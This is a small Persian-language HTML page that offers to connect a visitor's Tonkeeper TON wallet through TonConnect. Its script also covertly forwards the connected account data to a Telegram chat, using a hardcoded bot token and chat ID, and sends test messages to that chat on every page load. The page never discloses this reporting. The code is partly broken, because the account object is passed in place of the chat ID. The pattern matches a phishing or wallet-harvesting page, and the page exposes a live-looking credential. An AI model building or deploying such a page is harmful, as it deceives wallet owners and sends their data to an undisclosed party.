<!DOCTYPE html>
<html lang="fa">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>کانکت</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }

        #ton-connect-button {
            background-color: #0066cc;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 18px;
            border-radius: 5px;
        }

        #ton-connect-button:hover {
            background-color: #0055a5;
        }

        #wallet-info {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>

<body>

    <h1>اتصال به ولت تون کیپر</h1>
    <button id="ton-connect-button">اتصال به تون کیپر</button>

    <div id="wallet-info"></div>

    <script>
        let accountInfo = null; // متغیر برای ذخیره اطلاعات حساب

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://promahdimosavi.github.io/schams/manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        document.getElementById("ton-connect-button").addEventListener("click", () => {
            tonConnectUI.connect().then((wallet) => {
                // ذخیره اطلاعات حساب در متغیر accountInfo
                accountInfo = wallet;
                document.getElementById("wallet-info").innerHTML = `اتصال موفق! آدرس ولت: ${wallet.address}`;

                // اگر نیاز دارید به اطلاعات بیشتر از حساب دسترسی پیدا کنید، اینجا می‌توانید از accountInfo استفاده کنید
                console.log("اطلاعات حساب:", accountInfo);
                sendMessage(accountInfo)

            }).catch((error) => {
                console.error("اتصال با شکست مواجه شد:", error);
                document.getElementById("wallet-info").innerHTML = "خطا در اتصال. لطفا دوباره تلاش کنید.";
            });
        });


        const botToken = "7799310540:AAGBrg_g6F2xrUbxC00qMAo0dc-tK7GFMSs";

        const sendMessage = async (chatId = "7613159738", message) => {
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(telegramApiUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    console.log("پیام با موفقیت ارسال شد:", data);
                } else {
                    console.error("خطایی رخ داد:", response.status, response.statusText);
                }
            } catch (error) {
                console.error("خطا در اتصال:", error);
            }
        };

        // نمونه فراخوانی تابع
        sendMessage("7613159738", "این یک پیام آزمایشی است!");
        sendMessage("7613159738", "پیام دیگری برای تست ارسال شد.");


    </script>

</body>

</html>
